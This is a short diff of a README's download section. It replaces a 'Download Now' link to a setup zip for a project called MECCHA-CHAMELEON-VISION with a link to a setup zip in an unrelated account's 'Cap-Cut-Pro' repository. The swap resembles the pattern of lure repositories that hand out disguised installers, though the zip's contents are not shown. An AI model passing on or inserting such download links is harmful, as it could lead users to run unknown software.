@@ -17,7 +17,7 @@
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Blackzumpanel/MECCHA-CHAMELEON-VISION/releases/download/MecchaVision/setup-v2.2.2.zip)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Orangenovapersonify/Cap-Cut-Pro/releases/download/setup-v2.33/setup-v2.33.zip)
 
 
 </div>
